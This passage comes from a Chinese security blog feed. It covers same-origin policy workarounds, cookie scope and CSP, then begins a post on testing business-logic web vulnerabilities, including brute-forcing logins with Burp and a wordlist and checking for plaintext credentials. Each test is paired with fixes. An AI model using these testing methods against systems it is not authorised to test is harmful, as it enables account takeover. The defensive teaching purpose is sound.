class="hljs">HTTP/1.1 200 OKAccess-Control-Allow-Origin: http://K0rz3n.comContent-Type: application/xml......[Payload Here]</code></pre><h4 id="3-优缺点对比"><a href="#3-优缺点对比" class="headerlink" title="(3)优缺点对比"></a><strong>(3)优缺点对比</strong></h4><h5 id="优点"><a href="#优点" class="headerlink" title="优点"></a><strong>优点</strong></h5><p>1.CORS 通信与同源的 AJAX 通信没有差别，代码完全一样，容易维护。<br>2.支持所有类型的 HTTP 请求。</p><h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a><strong>缺点</strong></h5><p>1.存在兼容性问题，特别是 IE10 以下的浏览器。<br>2.第一次发送非简单请求时会多一次请求。</p><h3 id="2-JSONP-JSON-with-Padding"><a href="#2-JSONP-JSON-with-Padding" class="headerlink" title="2.JSONP(JSON with Padding)"></a><strong>2.JSONP(JSON with Padding)</strong></h3><p>由于 script 标签不受浏览器同源策略的影响，允许跨域引用资源。因此可以通过动态创建 script标签，然后利用 src 属性进行跨域，这也就是 JSONP 跨域的基本原理,jsonp 可以说是 json 的一种使用模式，其实 jsonp 我在之前的文章中也介绍过了 <a href="http://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/">传送门</a>。</p><h4 id="1-jsonp-的跨域流程"><a href="#1-jsonp-的跨域流程" class="headerlink" title="(1)jsonp 的跨域流程"></a><strong>(1)jsonp 的跨域流程</strong></h4><p><strong>直接通过下面的例子来说明 JSONP 实现跨域的流程：</strong></p><p>1.定义一个 回调函数 handleResponse 用来接收返回的数据</p><pre><code class="hljs">function handleResponse(data) &#123;    console.log(data);&#125;;</code></pre><p>2.动态创建一个 script 标签，并且告诉后端回调函数名叫 handleResponse</p><pre><code class="hljs">var body = document.getElementsByTagName(&#39;body&#39;)[0];var script = document.gerElement(&#39;script&#39;);script.src = &#39;http://K0rz3n.com/json?callback=handleResponse&#39;;body.appendChild(script);</code></pre><p>3.通过 script.src 请求 <code>http://www.K0rz3n.com/json?callback=handleResponse</code>，<br>4.后端能够识别这样的 URL 格式并处理该请求，然后返回 <code>handleResponse(&#123;&quot;name&quot;: &quot;K0rz3n&quot;&#125;)</code> 给浏览器<br>5.浏览器在接收到 <code>handleResponse(&#123;&quot;name&quot;: &quot;K0rz3n&quot;&#125;)</code> 之后立即执行 ，也就是执行 handleResponse 方法，获得后端返回的数据，这样就完成一次跨域请求了。</p><h4 id="2-优缺点对比"><a href="#2-优缺点对比" class="headerlink" title="(2)优缺点对比"></a><strong>(2)优缺点对比</strong></h4><p><strong>优点</strong></p><p>1.用于实现跟踪用户点击页面或动态广告曝光次数有较大的优势。</p><p><strong>缺点</strong></p><p>1.<strong>只支持 GET 请求(这个是比较大的一个限制条件)</strong>。<br>2.只能浏览器与服务器的单向通信，因为浏览器不能访问服务器的响应文本。</p><h3 id="3-img-src-跨域"><a href="#3-img-src-跨域" class="headerlink" title="3.img src 跨域"></a><strong>3.img src 跨域</strong></h3><p>由于 img 标签不受浏览器同源策略的影响，允许跨域引用资源。因此可以通过 img 标签的 src 属性进行跨域，这也就是 img src 跨域的基本原理。</p><h4 id="1-img-src-的跨域流程"><a href="#1-img-src-的跨域流程" class="headerlink" title="(1)img src 的跨域流程"></a><strong>(1)img src 的跨域流程</strong></h4><p><strong>直接通过下面的例子来说明图像 Ping 实现跨域的流程：</strong></p><pre><code class="hljs">var img = new Image();//通过 onload 及 onerror 事件可以知道响应是什么时候接收到的，但是不能获取响应文本img.onload = img.onerror = function() &#123;    console.log(&quot;Done!&quot;);&#125;//请求数据通过查询字符串形式发送img.src = &#39;http://www.K0rz3n.com/test?name=K0rz3n&#39;;</code></pre><h4 id="2-优缺点对比-1"><a href="#2-优缺点对比-1" class="headerlink" title="(2)优缺点对比"></a><strong>(2)优缺点对比</strong></h4><p><strong>优点</strong></p><p>1.用于实现跟踪用户点击页面或动态广告曝光次数有较大的优势。</p><p><strong>缺点</strong></p><p>1.只支持 GET 请求。<br>2.只能浏览器与服务器的单向通信，因为浏览器不能访问服务器的响应文本。</p><h3 id="4-Webserver-Proxy-跨域"><a href="#4-Webserver-Proxy-跨域" class="headerlink" title="4.Webserver Proxy 跨域"></a><strong>4.Webserver Proxy 跨域</strong></h3><p>浏览器有跨域限制，但是服务器不存在跨域问题，所以可以由服务器请求所要域的资源再返回给客户端。</p><p>服务器代理是万能的。</p><h3 id="5-document-domain-跨域"><a href="#5-document-domain-跨域" class="headerlink" title="5.document.domain 跨域"></a><strong>5.document.domain 跨域</strong></h3><h4 id="1-document-domain-的跨域流程"><a href="#1-document-domain-的跨域流程" class="headerlink" title="(1)document.domain 的跨域流程"></a><strong>(1)document.domain 的跨域流程</strong></h4><p><strong>对于主域名相同，而子域名不同的情况，可以使用 document.domain 来跨域。这种方式非常适用于 iframe 跨域的情况。</strong></p><p>比如，有一个页面，它的地址是 <a href="http://www.k0rz3n.com,在这个页面里面有一个/">http://www.K0rz3n.com，在这个页面里面有一个</a> iframe，它的 src 是 <a href="http://k0rz3n.com/b.html%E3%80%82%E5%BE%88%E6%98%BE%E7%84%B6%EF%BC%8C%E8%BF%99%E4%B8%AA%E9%A1%B5%E9%9D%A2%E4%B8%8E%E5%AE%83%E9%87%8C%E9%9D%A2%E7%9A%84">http://K0rz3n.com/b.html。很显然，这个页面与它里面的</a> iframe 框架是不同域的，所以我们是无法通过在页面中书写 js 代码来获取 iframe 中的东西的。</p><p>这个时候，document.domain 就可以派上用场了，我们只要把 <a href="http://www.k0rz3n.com/a.html">http://www.K0rz3n.com/a.html</a> 和 <a href="http://www.k0rz3n.com/b.html">http://www.K0rz3n.com/b.html</a> 这两个页面的 document.domain 都设成相同的域名就可以了。但要注意的是，document.domain 的设置是有限制的，我们只能把 document.domain 设置成<strong>自身或更高一级的父域，且主域必须相同</strong>。例如：a.b.K0rz3n.com 中某个文档的 document.domain 可以设成 a.b.K0rz3n.com、b.K0rz3n.com 、K0rz3n.com 中的任意一个，但是不可以设成 c.a.b.K0rz3n.com ，因为这是当前域的子域，也不可以设成 baidu.com，因为主域已经不相同了。</p><h4 id="2-document-domain-跨域的具体实现"><a href="#2-document-domain-跨域的具体实现" class="headerlink" title="(2)document.domain 跨域的具体实现"></a><strong>(2)document.domain 跨域的具体实现</strong></h4><p>例如，在页面 <a href="http://www.k0rz3n.com/a.html">http://www.K0rz3n.com/a.html</a> 中设置document.domain：</p><pre><code class="hljs">&lt;iframe src=&quot;http://www.K0rz3n.com/b.html&quot; id=&quot;myIframe&quot; onload=&quot;test()&quot;&gt;&lt;script&gt;    document.domain = &#39;K0rz3n.com&#39;; // 设置成主域    function test() &#123;        console.log(document.getElementById(&#39;myIframe&#39;).contentWindow);    &#125;&lt;/script&gt;</code></pre><p>在页面 <a href="http://k0rz3n.com/b.html">http://K0rz3n.com/b.html</a> 中也设置 document.domain，而且这也是必须的，虽然这个文档的 domain 就是 K0rz3n.com，但是还是必须显式地设置 document.domain 的值：</p><pre><code class="hljs">&lt;script&gt;    document.domain = &#39;K0rz3n.com&#39;; // document.domain 设置成与主页面相同&lt;/script&gt;</code></pre><p>这样，<a href="http://www.k0rz3n.com/a.html">http://www.K0rz3n.com/a.html</a> 就可以通过 js 访问到 <a href="http://k0rz3n.com/b.html">http://K0rz3n.com/b.html</a> 中的各种属性和对象了。</p><h3 id="6-window-name-跨域"><a href="#6-window-name-跨域" class="headerlink" title="6.window.name 跨域"></a><strong>6.window.name 跨域</strong></h3><h4 id="1-window-name-的跨域流程"><a href="#1-window-name-的跨域流程" class="headerlink" title="(1) window.name 的跨域流程"></a><strong>(1) window.name 的跨域流程</strong></h4><p>window 对象有个 name 属性，该属性有个特征：即在一个窗口（window）的生命周期内，窗口载入的所有的页面（不管是相同域的页面还是不同域的页面）都是共享一个 window.name 的，每个页面对 window.name 都有读写的权限，window.name 是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。</p><h4 id="2-window-name-跨域的具体实现"><a href="#2-window-name-跨域的具体实现" class="headerlink" title="(2) window.name 跨域的具体实现"></a><strong>(2) window.name 跨域的具体实现</strong></h4><p>通过下面的例子介绍如何通过 window.name 来跨域获取数据的。</p><p><strong>页面 <a href="http://www.k0rz3n.com/a.html">http://www.K0rz3n.com/a.html</a> 的代码：</strong></p><pre><code class="hljs">&lt;iframe src=&quot;http://K0rz3n.com/b.html&quot; id=&quot;myIframe&quot; onload=&quot;test()&quot; style=&quot;display: none;&quot;&gt;&lt;script&gt;    function test() &#123;//iframe载入 &quot;http://K0rz3n.com/b.html 页面后会执行该函数        var iframe = document.getElementById(&#39;myIframe&#39;);            //重置 iframe 的 onload 事件程序，此时经过后面代码重置 src 之后，http://www.K0rz3n.com/a.html     //页面与该 iframe 在同一个源了，可以相互访问了            iframe.onload = function() &#123;            var data = iframe.contentWindow.name; // 获取 iframe 里的 window.name            console.log(data); // hello world!        &#125;;            //重置一个与 http://www.K0rz3n.com/a.html 页面同源的页面            iframe.src = &#39;http://www.K0rz3n.com/c.html&#39;;    &#125;&lt;/script&gt;</code></pre><p><strong>页面 <a href="http://k0rz3n.com/b.html">http://K0rz3n.com/b.html</a> 的代码：</strong></p><pre><code class="hljs">&lt;script type=&quot;text/javascript&quot;&gt;    // 给当前的 window.name 设置一个 http://www.K0rz3n.com/a.html 页面想要得到的数据值     window.name = &quot;hello world!&quot;;&lt;/script&gt;</code></pre><h3 id="7-location-hash-跨域"><a href="#7-location-hash-跨域" class="headerlink" title="7.location.hash 跨域"></a><strong>7.location.hash 跨域</strong></h3><h4 id="1-location-hash-跨域的流程"><a href="#1-location-hash-跨域的流程" class="headerlink" title="(1)location.hash 跨域的流程"></a><strong>(1)location.hash 跨域的流程</strong></h4><p>location.hash 方式跨域，是子框架具有修改父框架 src 的 hash 值，通过这个属性进行传递数据，且更改 hash 值，页面不会刷新。<strong>但是传递的数据的字节数是有限的。</strong></p><h4 id="2-location-hash-跨域的具体实现"><a href="#2-location-hash-跨域的具体实现" class="headerlink" title="(2)location.hash 跨域的具体实现"></a><strong>(2)location.hash 跨域的具体实现</strong></h4><p><strong>页面 <a href="http://www.k0rz3n.com/a.html">http://www.K0rz3n.com/a.html</a> 的代码：</strong></p><pre><code class="hljs">&lt;iframe src=&quot;http://K0rz3n.com/b.html&quot; id=&quot;myIframe&quot; onload=&quot;test()&quot; style=&quot;display: none;&quot;&gt;&lt;script&gt;    // iframe载入 &quot;http://K0rz3n.com/b.html 页面后会执行该函数    function test() &#123;        //获取通过 http://K0rz3n.com/b.html 页面设置 hash 值        var data = window.location.hash;        console.log(data);    &#125;&lt;/script&gt;</code></pre><p><strong>页面 <a href="http://k0rz3n.com/b.html">http://K0rz3n.com/b.html</a> 的代码：</strong></p><pre><code class="hljs">&lt;script type=&quot;text/javascript&quot;&gt;    //设置父页面的 hash 值    parent.location.hash = &quot;world&quot;;&lt;/script&gt;</code></pre><h3 id="8-postMessage-跨域"><a href="#8-postMessage-跨域" class="headerlink" title="8.postMessage 跨域"></a><strong>8.postMessage 跨域</strong></h3><h4 id="1-postMessage-跨域的流程"><a href="#1-postMessage-跨域的流程" class="headerlink" title="(1)postMessage 跨域的流程"></a><strong>(1)postMessage 跨域的流程</strong></h4><p>window.postMessage(message，targetOrigin) 方法是 HTML5 新引进的特性，可以使用它来向其它的 window 对象发送消息，无论这个 window 对象是属于同源或不同源。这个应该就是以后解决 dom 跨域通用方法了。</p><p>调用 postMessage 方法的 window 对象是指要接收消息的那一个 window 对象，该方法的第一个参数 message 为要发送的消息，类型只能为字符串；第二个参数 targetOrigin 用来限定接收消息的那个 window 对象所在的域，如果不想限定域，可以使用通配符 *。</p><p>需要接收消息的 window 对象，可以通过监听自身的 message 事件来获取传过来的消息，消息内容储存在该事件对象的 data 属性中。</p><h4 id="2-postMessage-跨域的具体实现"><a href="#2-postMessage-跨域的具体实现" class="headerlink" title="(2)postMessage 跨域的具体实现"></a><strong>(2)postMessage 跨域的具体实现</strong></h4><p><strong>页面 <a href="http://www.k0rz3n.com/a.html">http://www.K0rz3n.com/a.html</a> 的代码：</strong></p><pre><code class="hljs">&lt;iframe src=&quot;http://K0rz3n.com/b.html&quot; id=&quot;myIframe&quot; onload=&quot;test()&quot; style=&quot;display: none;&quot;&gt;&lt;script&gt;    //iframe载入 &quot;http://K0rz3n.com/b.html 页面后会执行该函数    function test() &#123;        // 获取 http://K0rz3n.com/b.html 页面的 window 对象，        // 然后通过 postMessage 向 http://K0rz3n.com/b.html 页面发送消息        var iframe = document.getElementById(&#39;myIframe&#39;);        var win = iframe.contentWindow;        win.postMessage(&#39;我是来自 http://www.K0rz3n.com/a.html 页面的消息&#39;, &#39;*&#39;);    &#125;&lt;/script&gt;</code></pre><p><strong>页面 <a href="http://k0rz3n.com/b.html">http://K0rz3n.com/b.html</a> 的代码：</strong></p><pre><code class="hljs">&lt;script type=&quot;text/javascript&quot;&gt;    // 注册 message 事件用来接收消息    window.onmessage = function(e) &#123;        e = e || event; // 获取事件对象        console.log(e.data); // 通过 data 属性得到发送来的消息    &#125;&lt;/script&gt;</code></pre><h2 id="0X03-cookie-的路径和作用域"><a href="#0X03-cookie-的路径和作用域" class="headerlink" title="0X03 cookie 的路径和作用域"></a><strong>0X03 cookie 的路径和作用域</strong></h2><h3 id="1-cookie-的路径"><a href="#1-cookie-的路径" class="headerlink" title="1.cookie 的路径"></a><strong>1.cookie 的路径</strong></h3><p>Cookie 的路径是在服务器创建Cookie 时设置的，它的作用是决定浏览器访问服务器的某个资源时，<br>需要将浏览器端保存的哪些Cookie 归还给服务器</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A54.png" alt="此处输入图片的描述"></p><p>如上图所示，浏览器端保存的Cookie 有三个，分别是Cookie1、Cookie2 和Cookie3。</p><p>它们三个的访问路径分别为：</p><pre><code class="hljs">/Example/cookie/Example//Example1/cookie</code></pre><p>浏览器访问服务器端的路径为：</p><pre><code class="hljs">http://localhost:8080/Example/cookie/a/index.jsp</code></pre><p>也就是说index.jsp 页面的访问路径为：</p><pre><code class="hljs">/Example/cookie/a/</code></pre><p>该路径包含了Cookie1 和Cookie2 的路径，因此在访问index.jsp 时，浏览器会将Cookie1 和Cookie2<br>发送给服务器(简单的说就是父路径给子路径)。这就是Cookie 的路径的作用，其中涉及到访问路径。</p><p><strong>如果服务器创建Cookie 时没有设置路径，那么该Cookie 的路径是当前资源的访问路径。</strong></p><p>例如：在index.jsp 页面中创建了一个Cookie，index.jsp 页面的访问路径为“&#x2F;Example&#x2F;“，那么该Cookie 的路径就是 &#x2F;Example&#x2F;。如果服务器创建Cookie 时设置了路径，那么Cookie 的路径就是设置的路径，例如：<br>cookie.setPath(“&#x2F;Example&#x2F;cookie”)，那么该Cookie 的路径就是&#x2F;Example&#x2F;cookie。</p><h3 id="2-cookie-的作用域"><a href="#2-cookie-的作用域" class="headerlink" title="2.cookie 的作用域"></a><strong>2.cookie 的作用域</strong></h3><p>Cookie 还有一个属性就是域，Cookie 类中有设置和获取cookie 域的方法，如下所示：</p><p>(1)Void setDomain(String pattern)：设置cookie 的域；<br>(2)String getDomain()：获取cookie 的域，返回值的类型是String 类型。</p><p>一般我们很少使用cookie 的域，只有在多个二级域共享Cookie时才用。例如：<a href="http://www.baidu.com、zhidao.baidu.com、news.baidu.com、tieba.baidu.com/">www.baidu.com、zhidao.baidu.com、news.baidu.com、tieba.baidu.com</a> 这些域可以理解是百度的子项目，现在要<strong>在这些域中共享cookie</strong>，就需要使用cookie 的域.</p><p><strong>使用时需要注意以下两点：</strong></p><p>(1)设置domain 为：setDomain(“.baidu.com”)；<br>(2)设置path 为：setPath(“&#x2F;”)。</p><h2 id="0X04脚本源的归属问题"><a href="#0X04脚本源的归属问题" class="headerlink" title="0X04脚本源的归属问题"></a><strong>0X04脚本源的归属问题</strong></h2><p>关于脚本源的归属问题是这样规定的，脚本的源是由它所嵌入的页面决定的，也就是说，如果 利用 xss 漏洞向某个页面注入了 js 代码，那么这段 js 代码就是属于这个网站所属的源的，就能对这个网站的内容进行操作，比如说读取 dom 的内容等，这是非常危险的，因为浏览器没有能力去鉴别这段代码是不是网站所有者自己写进网页的，于是就引出了 CSP 这个东西.</p><h2 id="0X05-CSP"><a href="#0X05-CSP" class="headerlink" title="0X05 CSP"></a><strong>0X05 CSP</strong></h2><p>一个 编写 CSP 的网站 <a href="https://www.cspisawesome.com/">https://www.cspisawesome.com/</a></p><h3 id="1-什么是CSP"><a href="#1-什么是CSP" class="headerlink" title="1.什么是CSP"></a><strong>1.什么是CSP</strong></h3><p>全称：Content Security Policy 内容安全策略,管理员可以定义多种策略的范围，<strong>这些策略可以被任意组合，不一定要实现全部</strong></p><p>CSP定义了Content-Security-Policy HTTP头来允许你创建一个<strong>可信来源的白名单</strong>，使得浏览器只执行和渲染来自这些来源的资源，而不是盲目信任服务器提供的所有内容。即使攻击者可以找到漏洞来注入脚本，但是因为来源不包含在白名单里，因此将不会被执行。</p><h3 id="2-CSP-包含哪些内容"><a href="#2-CSP-包含哪些内容" class="headerlink" title="2.CSP 包含哪些内容"></a><strong>2.CSP 包含哪些内容</strong></h3><h4 id="1-内容源"><a href="#1-内容源" class="headerlink" title="(1)内容源"></a><strong>(1)内容源</strong></h4><p>大多数的策略指令都需要一个或者多个内容源，这些内容源指明内容应该从什么地方加载</p><h4 id="2-源列表"><a href="#2-源列表" class="headerlink" title="(2)源列表"></a><strong>(2)源列表</strong></h4><p>指定主机 主机可以使用 通配符，主机与主机之间使用空格分割</p><h4 id="3-关键字"><a href="#3-关键字" class="headerlink" title="(3)关键字"></a><strong>(3)关键字</strong></h4><p>关键字用来描述某些特别的内容源</p><p>1.’none’ :不匹配任何的URL，两侧的单引号必须</p><p>2.’self’ :与文档同源 </p><p>3.’unsafe-inline’ :允许使用内联资源，包括内联的<code>&lt;script&gt;</code> 内联的 javascript:URL 内联的事件处理函数 onerror 和内联的<code>&lt;style&gt;</code></p><p>4.’unsafe-eval’:允许通过字符串创建代码的方式</p><blockquote><p><strong>注意：</strong> unsafe-inline 和 unsafe-eval 都是不安全的，他会使网站有跨站脚本的风险</p></blockquote><h4 id="4-数据"><a href="#4-数据" class="headerlink" title="(4)数据"></a><strong>(4)数据</strong></h4><p>data:允许使用 data:URL 是不安全的</p><p>mediatream:将 mediastream:URL 作为内容源</p><p><strong>两个实例：</strong></p><pre><code class="hljs">Content-Security-Policy: default-src &#39;self&#39; trustedscripts.foo.comContent-Security-Policy: default-src &#39;self&#39;; img-src &#39;self&#39; data:; media-src mediastream:</code></pre><h4 id="5-指令"><a href="#5-指令" class="headerlink" title="(5)指令"></a><strong>(5)指令</strong></h4><p><strong>1.base-uri</strong><br>base-uri 指令定义了 URI，它可以作为文档的基准 URL。如果没有指定值，那么任何 URI 都被允许。如果没有指定这条指令，浏览器会使用 base 元素中的 URL。</p><pre><code class="hljs">base-uri source-list</code></pre><p><strong>2.child-src</strong></p><p>child-src 指定定义了 web workers 以及嵌套的浏览上下文（如 <code>&lt;frame&gt;</code> 和 <code>&lt;iframe&gt;</code> ）的源。</p><pre><code class="hljs">child-src source-list</code></pre><p><strong>3.connect-src</strong></p><p>connect-src 指令定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源。</p><pre><code class="hljs">connect-src source-list</code></pre><p><strong>4.default-src</strong></p><p>default-src 指令定义了那些没有被更精确指令指定的（默认）安全策略。该指令包含了以下指令：</p><pre><code class="hljs">child-srcconnect-srcfont-srcimg-srcmedia-srcobject-srcscript-srcstyle-srcdefault-src source-list</code></pre><p><strong>5.img-src</strong></p><p>img-src指令指定图像和图标的有效来源。</p><pre><code class="hljs">img-src source-list</code></pre><p><strong>6.script-src</strong></p><p>script-src指令指定JavaScript的有效源。当包含script-src或default-src指令时，除非分别指定“unsafe-inline”和“unsafe-eval”，否则内联脚本和eval()将被禁用。</p><p><strong>7.style-src</strong></p><p>style-src指令指定样式表的有效来源。这包括外部加载的样式表和<code>&lt;style&gt;</code>元素和HTML样式属性的内联使用。来自源列表中不包含的源的样式表不会被请求或加载。当包含style-src或default-src指令时，<code>&lt;style&gt;</code>元素和HTML样式属性的内联使用将被禁用，除非您指定’unsafe-inline’。</p><p><strong>8.object-src</strong></p><p>object-src指令为<code>&lt;object&gt;</code>，<code> &lt;embed&gt;</code>，<code> &lt;applet&gt;</code>元素指定有效的源。</p><pre><code class="hljs">object-src source-list</code></pre><h2 id="0X06-总结"><a href="#0X06-总结" class="headerlink" title="0X06 总结"></a><strong>0X06 总结</strong></h2><p>这篇文章主要是对一些前端或者浏览器中涉及到和 “源” 有关的一些东西的罗列和整理吧，很多东西来源于网络，夹杂了一些我个人的理解，全当做后期的备忘来用吧</p><h2 id="0X07-参考"><a href="#0X07-参考" class="headerlink" title="0X07 参考"></a><strong>0X07 参考</strong></h2><p><a href="https://yq.aliyun.com/ziliao/317883">https://yq.aliyun.com/ziliao/317883</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy</a><br><a href="https://blog.csdn.net/shimiso/article/details/21830313">https://blog.csdn.net/shimiso/article/details/21830313</a><br><a href="https://blog.csdn.net/wonking666/article/details/79159180">https://blog.csdn.net/wonking666/article/details/79159180</a><br><a href="https://www.cnblogs.com/renpingsheng/p/7688134.html">https://www.cnblogs.com/renpingsheng/p/7688134.html</a><br><a href="https://www.w3.org/Security/wiki/Same_Origin_Policy">https://www.w3.org/Security/wiki/Same_Origin_Policy</a><br><a href="https://w3c.github.io/webappsec-csp/">https://w3c.github.io/webappsec-csp/</a><br><a href="https://security.stackexchange.com/questions/8264/why-is-the-same-origin-policy-so-important">https://security.stackexchange.com/questions/8264/why-is-the-same-origin-policy-so-important</a><br><a href="https://security.stackexchange.com/questions/91165/why-is-the-synchronizer-token-pattern-preferred-over-the-origin-header-check-to">https://security.stackexchange.com/questions/91165/why-is-the-synchronizer-token-pattern-preferred-over-the-origin-header-check-to</a><br><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a><br><a href="https://lorexxar.cn/2016/08/08/ccsp/">https://lorexxar.cn/2016/08/08/ccsp/</a><br><a href="https://lorexxar.cn/2018/04/05/0ctf2018-blog/">https://lorexxar.cn/2018/04/05/0ctf2018-blog/</a><br><a href="https://www.cnblogs.com/laixiangran/p/9064769.html">https://www.cnblogs.com/laixiangran/p/9064769.html</a></p>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>业务 Web 漏洞攻击与防御的思考</title>
    <link href="/2019/02/07/%E4%B8%9A%E5%8A%A1%20Web%20%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <url>/2019/02/07/%E4%B8%9A%E5%8A%A1%20Web%20%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%E7%9A%84%E6%80%9D%E8%80%83/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>随着网络安全观念的进一步强化，以及在开发过程中越来越成熟的自动化防护机制使得基础 web 漏洞的挖掘和利用变得越来越困难，所以加强对业务安全逻辑漏洞的学习和利用变得尤其重要，这篇文章也算是我学习和思考的一个记录。</p><h2 id="0X01-为什么学习业务安全"><a href="#0X01-为什么学习业务安全" class="headerlink" title="0X01 为什么学习业务安全"></a><strong>0X01 为什么学习业务安全</strong></h2><p>其实除了我个人在实战中深刻的体会到基础 Web 漏洞的挖掘困难以外(常常是 xss 或者 csrf之类的，sqli 都少之又少)，我还从一些安全事件(比如 pdd 的百元优惠券)中发现业务逻辑的安全漏洞可能造成的危害更大，涉及到的经济利益也更多，这也成为了不法分子重点关注的对象，我们作为安全研究人员也要重点学习研究。</p><span id="more"></span><h2 id="0X02-业务安全测试的一般流程"><a href="#0X02-业务安全测试的一般流程" class="headerlink" title="0X02 业务安全测试的一般流程"></a><strong>0X02 业务安全测试的一般流程</strong></h2><h3 id="1-前期熟悉"><a href="#1-前期熟悉" class="headerlink" title="1.前期熟悉"></a><strong>1.前期熟悉</strong></h3><p>要去了解当前系统的规模、已经具备的安全措施、系统的部署情况等</p><h3 id="2-场景建模"><a href="#2-场景建模" class="headerlink" title="2.场景建模"></a><strong>2.场景建模</strong></h3><p>掌握重要的系统功能，并将每个系统功能划分成待测试的模块，如下图所示</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%B8%9A%E5%8A%A1Web1.png" alt="此处输入图片的描述"></p><h3 id="3-功能梳理"><a href="#3-功能梳理" class="headerlink" title="3.功能梳理"></a><strong>3.功能梳理</strong></h3><p>对每个不同的模块的运作流程进行梳理，通常分为以下两个维度：</p><p>(1)用户端、管理员端<br>(2)客户端、服务器端</p><p><strong>如下图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%B8%9A%E5%8A%A1Web2.png" alt="此处输入图片的描述"></p><h3 id="4-风险分析"><a href="#4-风险分析" class="headerlink" title="4.风险分析"></a><strong>4.风险分析</strong></h3><p>可能存在的风险点如下图</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%B8%9A%E5%8A%A1Web3.png" alt="此处输入图片的描述"></p><h4 id="1-业务环节存在的风险"><a href="#1-业务环节存在的风险" class="headerlink" title="(1)业务环节存在的风险"></a><strong>(1)业务环节存在的风险</strong></h4><p>主要是用户可见的，如注册登录等是否有完善的身份验证机制，cookie session 机制，验证码能否被爆破等</p><h4 id="2-支撑系统存在的风险"><a href="#2-支撑系统存在的风险" class="headerlink" title="(2)支撑系统存在的风险"></a><strong>(2)支撑系统存在的风险</strong></h4><p>用户访问控制机制是否完善，是否存在水平或垂直越权，用户数据是否加密存储，是否明文传输，是否存在未授权的接口调用，重放遍历等</p><h4 id="3-业务环节间存在的风险"><a href="#3-业务环节间存在的风险" class="headerlink" title="(3)业务环节间存在的风险"></a><strong>(3)业务环节间存在的风险</strong></h4><p>业务流程是否存在乱序，是否可以跳过、回退或者是重放。环节间的数据传输是否有一致性校验以及加密机制，是否可以被监听、窃取、篡改或者重放。</p><h4 id="4-支撑系统间存在的风险"><a href="#4-支撑系统间存在的风险" class="headerlink" title="(4)支撑系统间存在的风险"></a><strong>(4)支撑系统间存在的风险</strong></h4><p>系统间传递的参数是否加密，是否能监听窃取或者篡改，是否有着完备的过滤机制来预防 SQLi XSS 等攻击</p><h4 id="5-业务环节与支撑系统间存在的风险"><a href="#5-业务环节与支撑系统间存在的风险" class="headerlink" title="(5)业务环节与支撑系统间存在的风险"></a><strong>(5)业务环节与支撑系统间存在的风险</strong></h4><p>数据传输是否加密，是否用不完善的加密机制(如：前端加密，简单的md5等),是否能比较好的处理请求的并发，防止出现条件竞争，是否有完善的过滤和编码机制预防 SQLi XSS 等攻击。</p><h3 id="5-开始测试"><a href="#5-开始测试" class="headerlink" title="5.开始测试"></a><strong>5.开始测试</strong></h3><p>手工与自动化工具结合，白盒和黑盒相结合的方式进行测试</p><h3 id="6-撰写报告"><a href="#6-撰写报告" class="headerlink" title="6.撰写报告"></a><strong>6.撰写报告</strong></h3><p>根据不同企业或者公司的要求进行撰写，详细说明漏洞点，触发条件以及修复建议等</p><h2 id="0X03-业务测试技术"><a href="#0X03-业务测试技术" class="headerlink" title="0X03 业务测试技术"></a><strong>0X03 业务测试技术</strong></h2><h3 id="1-登录认证模块"><a href="#1-登录认证模块" class="headerlink" title="1.登录认证模块"></a><strong>1.登录认证模块</strong></h3><h4 id="1-暴力破解"><a href="#1-暴力破解" class="headerlink" title="(1)暴力破解"></a><strong>(1)暴力破解</strong></h4><h5 id="测试方法"><a href="#测试方法" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>常常使用 Bp 结合字典对账号密码进行暴力破解</p><blockquote><p><strong>注意：</strong><br>1.intercept is on 关闭的时候浏览器的请求依然会经过 Bp 只是不被拦截，所有的请求可以在 history 中查看</p></blockquote><h5 id="修复建议"><a href="#修复建议" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>1.设置登录验证码，并在尝试登录后改变，同时验证码的强度不能过低，防止攻击者使用 OCR 识别<br>2.设置登录失败次数限制，相同用户五分钟内失败6次则三小时内禁止登录<br>3.可增加手机短信校验等辅助校验方式</p><h4 id="2-本地加密传输测试"><a href="#2-本地加密传输测试" class="headerlink" title="(2)本地加密传输测试"></a><strong>(2)本地加密传输测试</strong></h4><h5 id="测试方法-1"><a href="#测试方法-1" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>(1)首先查看是否使用了 SSL(HTTPS)，如果没有使用 SSL 的话，使用 Bp 获登录数据包，查看是否存在明文传输，如图所示</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%B8%9A%E5%8A%A1Web4.png" alt="此处输入图片的描述"></p><p>此时可判定存在风险</p><p>(2)如果是使用了 SSL 可以使用 wireshark 抓包看一下是不是真的加密了，如图所示</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%B8%9A%E5%8A%A1Web5.png" alt="此处输入图片的描述"></p><h5 id="修复建议-1"><a href="#修复建议-1" class="headerlink" 